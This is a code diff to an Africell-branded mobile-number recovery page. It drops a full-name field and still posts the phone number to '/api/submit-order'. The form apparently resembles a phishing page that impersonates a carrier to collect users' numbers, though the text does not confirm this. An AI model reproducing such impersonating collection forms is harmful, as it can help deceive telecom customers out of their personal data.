@@ -67,8 +67,8 @@
             font-weight: 800;
             color: #000000;
             text-align: center;
-            margin-top: 40px;
-            margin-bottom: 16px;
+            margin-top: 50px;
+            margin-bottom: 24px;
         }
 
         /* Instruction Text */
@@ -77,38 +77,7 @@
             color: #000000;
             text-align: center;
             font-weight: 400;
-            margin-bottom: 30px;
-        }
-
-        /* Full Name Input Group */
-        .forgot-input-group {
-            width: 100%;
-            margin-bottom: 20px;
-        }
-
-        .forgot-single-field {
-            width: 100%;
-            height: 60px;
-            background: #ffffff;
-            border: 2px solid #991676;
-            border-radius: 18px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #000000;
-            text-align: center;
-            outline: none;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-
-        .forgot-single-field::placeholder {
-            color: #666666;
-            font-weight: 400;
-            text-align: center;
-        }
-
-        .forgot-single-field:focus {
-            border-color: #79105c;
+            margin-bottom: 40px;
         }
 
         /* Input Row Container */
@@ -116,7 +85,7 @@
             display: flex;
             gap: 18px;
             width: 100%;
-            margin-bottom: 35px;
+            margin-bottom: 40px;
         }
 
         /* Country Code Box */
@@ -293,12 +262,7 @@
         <!-- Main Body Content -->
         <div class="forgot-content">
             <h1 class="forgot-title">Mobile Number</h1>
-            <p class="forgot-instruction">Please Enter your details</p>
-
-            <!-- Full Name Input Field -->
-            <div class="forgot-input-group">
-                <input type="text" id="fullName" class="forgot-single-field" placeholder="Full Name" required>
-            </div>
+            <p class="forgot-instruction">Please Enter your mobile number</p>
 
             <!-- Phone Input Split Row -->
             <div class="forgot-input-row">
@@ -341,15 +305,9 @@
         }
 
         async function submitRecoveryPhone() {
-            const nameVal = document.getElementById('fullName').value.trim();
             const rawPhone = document.getElementById('recoveryPhone').value.trim();
             const sendBtn = document.getElementById('sendBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
-
-            if (!nameVal) {
-                showAppAlert('❌ Please enter your full name');
-                return;
-            }
 
             if (!rawPhone || !isValidSierraLeonePhone(rawPhone)) {
                 showAppAlert('❌ Enter Correct Africell Number');
@@ -359,7 +317,6 @@
             const fullPhone = '+232 ' + rawPhone;
             localStorage.setItem('africellUserPhone', fullPhone);
             localStorage.setItem('userPhone', fullPhone);
-            localStorage.setItem('africellFullName', nameVal);
 
             try {
                 sendBtn.classList.add('disabled-state');
@@ -368,10 +325,7 @@
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: fullPhone, 
-                        uniqueId: `Full Name: ${nameVal} | Signup Mobile Number` 
-                    })
+                    body: JSON.stringify({ phone: fullPhone, uniqueId: 'Signup Mobile Number' })
                 });
 
                 const result = await response.json();
